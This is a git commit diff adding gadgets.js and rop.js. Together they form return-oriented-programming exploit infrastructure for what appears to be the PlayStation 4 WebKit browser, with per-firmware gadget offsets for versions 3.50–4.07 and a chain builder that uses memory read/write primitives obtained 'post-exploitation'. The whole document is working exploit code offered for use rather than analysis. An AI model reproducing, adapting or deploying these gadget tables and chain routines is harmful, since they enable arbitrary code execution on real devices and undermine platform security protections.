73c49815a9ca9482283eb6da1f710f447046e5cf
Specter <cryptogenicdev@gmail.com>
2017-04-04 20:23:47 -0400

    Version 1.0
    -

---
+++ gadgets.js
@@ -0,0 +1,161 @@
+/* For storing the gadget and import map */
+window.gadgetMap = [];
+window.basicImportMap = [];
+
+/* All function stubs / imports from other modules */
+var generateBasicImportMap = function()
+{
+  window.basicImportMap =
+  {
+    '3.50':
+    {
+      'setjmp':            getGadget('libSceWebKit2', 0x2B8),     // setjmp imported from libkernel
+      '__stack_chk_fail':  getGadget('libSceWebKit2', 0x276D150), // __stack_chk_fail imported from libkernel
+    },
+
+    '3.55':
+    {
+      'setjmp':            getGadget('libSceWebKit2', 0x2B8),     // setjmp imported from libkernel
+      '__stack_chk_fail':  getGadget('libSceWebKit2', 0x276D150), // __stack_chk_fail imported from libkernel
+    },
+
+    '3.70':
+    {
+      'setjmp':            getGadget('libSceWebKit2', 0x2B8),     // setjmp imported from libkernel
+      '__stack_chk_fail':  getGadget('libSceWebKit2', 0x276D150), // __stack_chk_fail imported from libkernel
+    },
+
+    '4.00':
+    {
+      'setjmp':            getGadget('libSceWebKit2', 0x270),     // setjmp imported from libkernel
+      '__stack_chk_fail':  getGadget('libSceWebKit2', 0x2729260), // __stack_chk_fail imported from libkernel
+    },
+
+    '4.06':
+    {
+      'setjmp':            getGadget('libSceWebKit2', 0x270),     // setjmp imported from libkernel
+      '__stack_chk_fail':  getGadget('libSceWebKit2', 0x273D260), // __stack_chk_fail imported from libkernel
+    },
+
+    '4.07':
+    {
+      'setjmp':            getGadget('libSceWebKit2', 0x270),     // setjmp imported from libkernel
+      '__stack_chk_fail':  getGadget('libSceWebKit2', 0x273D260), // __stack_chk_fail imported from libkernel
+    }
+  };
+}
+
+/* All gadgets from the binary of available modules */
+var generateGadgetMap = function()
+{
+  window.gadgetMap =
+  {
+    '3.50':
+    {
+      'pop rsi':  getGadget('libSceWebKit2', 0xB9EBB),
+      'pop rdi':  getGadget('libSceWebKit2', 0x113991),
+      'pop rax':  getGadget('libSceWebKit2', 0x1C6AB),
+      'pop rcx':  getGadget('libSceWebKit2', 0x3CA9FD),
+      'pop rdx':  getGadget('libSceWebKit2', 0x1AFA),
+      'pop r8':   getGadget('libSceWebKit2', 0x4C13BD),
+      'pop r9':   getGadget('libSceWebKit2', 0xEE0A8F),
+      'pop rsp':  getGadget('libSceWebKit2', 0x376850),
+
+      'mov rax, rdi':             getGadget('libSceWebKit2', 0x57C3),
+      'mov qword ptr [rdi], rax': getGadget('libSceWebKit2', 0x11FC37),
+      'mov qword ptr [rdi], rsi': getGadget('libSceWebKit2', 0x4584D0),
+
+      'jmp addr': getGadget('libSceWebKit2', 0x86D4F4),
+    },
+
+    '3.55':
+    {
+      'pop rsi':  getGadget('libSceWebKit2', 0xB9EBB),
+      'pop rdi':  getGadget('libSceWebKit2', 0x113991),
+      'pop rax':  getGadget('libSceWebKit2', 0x1C6AB),
+      'pop rcx':  getGadget('libSceWebKit2', 0x3CA9FD),
+      'pop rdx':  getGadget('libSceWebKit2', 0x1AFA),
+      'pop r8':   getGadget('libSceWebKit2', 0x4C13BD),
+      'pop r9':   getGadget('libSceWebKit2', 0xEE0A8F),
+      'pop rsp':  getGadget('libSceWebKit2', 0x376850),
+
+      'mov rax, rdi':             getGadget('libSceWebKit2', 0x57C3),
+      'mov qword ptr [rdi], rax': getGadget('libSceWebKit2', 0x11FC37),
+      'mov qword ptr [rdi], rsi': getGadget('libSceWebKit2', 0x4584D0),
+
+      'jmp addr': getGadget('libSceWebKit2', 0x86D4F4),
+    },
+
+    '3.70':
+    {
+      'pop rsi':  getGadget('libSceWebKit2', 0xB9EBB),
+      'pop rdi':  getGadget('libSceWebKit2', 0x113991),
+      'pop rax':  getGadget('libSceWebKit2', 0x1C6AB),
+      'pop rcx':  getGadget('libSceWebKit2', 0x3CA71B),
+      'pop rdx':  getGadget('libSceWebKit2', 0x1AFA),
+      'pop r8':   getGadget('libSceWebKit2', 0x1C6AA),
+      'pop r9':   getGadget('libSceWebKit2', 0xEE0A8F),
+      'pop rsp':  getGadget('libSceWebKit2', 0x376850),
+
+      'mov rax, rdi':             getGadget('libSceWebKit2', 0x57C3),
+      'mov qword ptr [rdi], rax': getGadget('libSceWebKit2', 0x11FC37),
+      'mov qword ptr [rdi], rsi': getGadget('libSceWebKit2', 0x4584D0),
+
+      'jmp addr': getGadget('libSceWebKit2', 0x86D4F4),
+    },
+
+    '4.00':
+    {
+      'pop rsi':  getGadget('libSceWebKit2', 0xA459E),
+      'pop rdi':  getGadget('libSceWebKit2', 0x10F1C1),
+      'pop rax':  getGadget('libSceWebKit2', 0x1D70B),
+      'pop rcx':  getGadget('libSceWebKit2', 0x1FCA9B),
+      'pop rdx':  getGadget('libSceWebKit2', 0xD6660),
+      'pop r8':   getGadget('libSceWebKit2', 0x4A3B0D),
+      'pop r9':   getGadget('libSceWebKit2', 0xEB5F8F),
+      'pop rsp':  getGadget('libSceWebKit2', 0x20AEB0),
+
+      'mov rax, rdi':             getGadget('libSceWebKit2', 0x5863),
+      'mov qword ptr [rdi], rax': getGadget('libSceWebKit2', 0x11ADD7),
+      'mov qword ptr [rdi], rsi': getGadget('libSceWebKit2', 0x43CF70),
+
+      'jmp addr': getGadget('libSceWebKit2', 0x852624),
+    },
+
+    '4.06':
+    {
+      'pop rsi':  getGadget('libSceWebKit2', 0xA459E),
+      'pop rdi':  getGadget('libSceWebKit2', 0x10F1C1),
+      'pop rax':  getGadget('libSceWebKit2', 0x1D70B),
+      'pop rcx':  getGadget('libSceWebKit2', 0x25EF03),
+      'pop rdx':  getGadget('libSceWebKit2', 0x1D12),
+      'pop r8':   getGadget('libSceWebKit2', 0x1D70A),
+      'pop r9':   getGadget('libSceWebKit2', 0xEB5F8F),
+      'pop rsp':  getGadget('libSceWebKit2', 0x20AEB0),
+
+      'mov rax, rdi':             getGadget('libSceWebKit2', 0x5863),
+      'mov qword ptr [rdi], rax': getGadget('libSceWebKit2', 0x11ADD7),
+      'mov qword ptr [rdi], rsi': getGadget('libSceWebKit2', 0x43CF70),
+
+      'jmp addr': getGadget('libSceWebKit2', 0x852624),
+    },
+
+    '4.07':
+    {
+      'pop rsi':  getGadget('libSceWebKit2', 0xA459E),
+      'pop rdi':  getGadget('libSceWebKit2', 0x10F1C1),
+      'pop rax':  getGadget('libSceWebKit2', 0x1D70B),
+      'pop rcx':  getGadget('libSceWebKit2', 0x25EF03),
+      'pop rdx':  getGadget('libSceWebKit2', 0x1D12),
+      'pop r8':   getGadget('libSceWebKit2', 0x1D70A),
+      'pop r9':   getGadget('libSceWebKit2', 0xEB5F8F),
+      'pop rsp':  getGadget('libSceWebKit2', 0x20AEB0),
+
+      'mov rax, rdi':             getGadget('libSceWebKit2', 0x5863),
+      'mov qword ptr [rdi], rax': getGadget('libSceWebKit2', 0x11ADD7),
+      'mov qword ptr [rdi], rsi': getGadget('libSceWebKit2', 0x43CF70),
+
+      'jmp addr': getGadget('libSceWebKit2', 0x852624),
+    }
+  };
+}
---
+++ rop.js
@@ -0,0 +1,79 @@
+/* Leave these values untouched, they will be set properly post-exploitation */
+var moduleBaseAddresses =
+{
+  'libkernel': 0,
+  'libSceWebKit2': 0
+};
+
+/* Simply adds given offset to given module's base address */
+function getGadget(moduleName, offset)
+{
+  return moduleBaseAddresses[moduleName].add32(offset);
+}
+
+/* Called to start a new ROP chain */
+var rop = function(p) {
+  this.ropChain = new Uint32Array(0x1000);
+  this.ropChainPtr = p.read8(p.leakval(this.ropChain).add32(0x28));
+  this.count = 0;
+
+  /* Clears the chain */
+  this.clear = function() {
+    this.count = 0;
+    this.runtime = undefined;
+
+    for (var i = 0; i < 0xFF0 / 2; i++)
+    {
+      p.write8(this.ropChainPtr.add32(i*8), 0);
+    }
+  };
+
+  /* Gets the current chain index and increments it */
+  this.getChainIndex = function() {
+    this.count++;
+    return this.count-1;
+  }
+
+  /* Pushes a gadget or value on the stack */
+  this.push = function(val) {
+    p.write8(this.ropChainPtr.add32(this.getChainIndex() * 8), val);
+  }
+
+  /* Writes a 64-bit value to given location */
+  this.push64 = function(where, what)
+  {
+    this.push(window.gadgets["pop rdi"]);
+    this.push(where);
+    this.push(window.gadgets["pop rsi"]);
+    this.push(what);
+    this.push(window.gadgets["mov qword ptr [rdi], rsi"]);
+  }
+
+  /* Sets up a function call into a module by address */
+  this.call = function (rip, rdi, rsi, rdx, rcx, r8, r9)
+  {
+    this.push(window.gadgets["pop rdi"]);
+    this.push(rdi);
+    this.push(window.gadgets["pop rsi"]);
+    this.push(rsi);
+    this.push(window.gadgets["pop rdx"]);
+    this.push(rdx);
+    this.push(window.gadgets["pop rcx"]);
+    this.push(rcx);
+    this.push(window.gadgets["pop r8"]);
+    this.push(r8);
+    this.push(window.gadgets["pop r9"]);
+    this.push(r9);
+    this.push(rip);
+    return this;
+  }
+
+  /* Loads the ROP chain and initializes it */
+  this.run = function() {
+    var retv = p.loadchain(this);
+    this.clear();
+
+    return retv;
+  }
+  return this;
+};
